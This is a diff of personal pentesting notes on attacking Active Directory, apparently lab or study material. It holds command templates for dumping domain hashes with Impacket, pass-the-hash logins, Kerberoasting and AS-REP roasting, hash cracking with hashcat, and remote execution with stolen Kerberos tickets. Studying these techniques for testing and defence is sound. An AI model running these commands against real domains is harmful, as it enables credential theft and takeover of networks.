@@ -29,12 +29,13 @@ Compromise member of Domain Admin group.
 Compromise domain controller -> can modify all domain-joined computers or execute applications on them. 
 
 AD: depends on DNS server, typical DC hosts DNS server that is authoritative for a given domain. 
+Authentication mechanisms: Kerberos or NTLM 
 
 Typical AD pen test:
 - Exploit and gain access to host on domain as a domain user 
 - Enumerate domain users and groups.  
 - Privilege escalate or move laterally. 
-- Get Domain Admin access, pwn domin controller. 
+- Get Domain Admin or Service Account access and onto the domain controller. 
 
 ## Quick Commands  
 
@@ -95,6 +96,16 @@ PowerShell Active Directory Module (only on DC by default)
 [evil-winrm](https://github.com/nubix/evil-winrm)    
 [ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   
 
+## NTLM Authentication
+### Impacket Scripts 
+If you have creds for the backup account for domain controller: can dump all hashes    
+
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
+    
+Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    
+
+    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]  
+
 ## Kerberos (Port 88)   
 Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
 [Messing With Kerberos Using Rubeus](https://endark.gitbook.io/kb/windows/lab-attacks/messing-with-kerberos-using-rubeus) 
@@ -104,47 +115,72 @@ Tools: [Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.c
 
 
     ./kerbrute userenum userlist.txt -d [name] --dc [name]     
+    
+## Kerberos Attacks 
 
-### Impacket 
-Check for Kerberoasting with Impacket 
+Kerbrute Enumeration (No domain access needed) 
+Kerberoasting (Access as any user needed) 
+AS-REP Roasting with Rubeus and Impacket (Access as any user needed) 
+Overpass the Hash / Pass the Key (PTK) 
+Pass the Ticket (Access to user on the domain needed) 
+Golden/Silver Ticket Attacks (Domain admin needed / Service hash needed) 
+Skeleton key attacks using mimikatz (Domain Admin needed) 
+
+### Kerbrute Enumeration 
+No domain access needed 
+
+Kerbrute: https://github.com/ropnop/kerbrute
+/usr/share/wordlists/ADUsers.txt
+
+### Kerberoasting  
+Check for Kerberoasting with Impacket -> SPNs 
 
     GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john
 
-Scripts 
+Kerberoasting with Impacket
+
+     python3 GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  
+     sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip <ip> -request
+     
+ Kerberoasting with Rubeus (install on Windows host in domain) 
+ 
+  rubeus.exe kerberoast 
+ 
+Crack passwords with hashcat 
+
+  hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/ADPass.txt
+  13100: kerberos 5, 0: straight attack mode
+
+### AS-REP Roasting with Rubeus and Impacket
 Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        
 
     python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
-    
-If you have creds for the backup account for domain controller: can dump all hashes    
+     
 
-    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
-    
-Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    
-
-    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]    
-    
-
-ASREPRoast:
+ASREPRoast with Impacket:
 
      impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
      impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 
-Kerberoasting: 
+ASREP Roast with Rubeus:
 
-     impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 
+### Golden / Silver Ticket Attacks: 
 
-Overpass The Hash/Pass The Key (PTK):
- 
+### Overpass The Hash/Pass The Key (PTK):
+Impacket 
+
     python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
     python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
     python3 getTGT.py <domain_name>/<user_name>:[password]
 
-### Using TGT key to excute remote commands from the following impacket scripts:
+### Pass the Ticket 
+Using TGT key to execute remote commands from the following impacket scripts:
 
     python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
     python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
     python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 
+### Skeleton Key Attacks using Mimikatz 
 
 ## LDAP (Port 636)
 Anonymous Credential LDAP Dumping: 
@@ -168,6 +204,7 @@ Windapsearch:
 https://github.com/ropnop/windapsearch 
 
     python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
+    
 ## Other Exploits
 [Print Nightmare Walkthrough](https://themayor.notion.site/341cf3705cc64752b466046584de45b8?v=4f2173ad749249b293a89ab5391805ec&p=ef69c17e82c5471fb4648ccabbf5c937) 
 
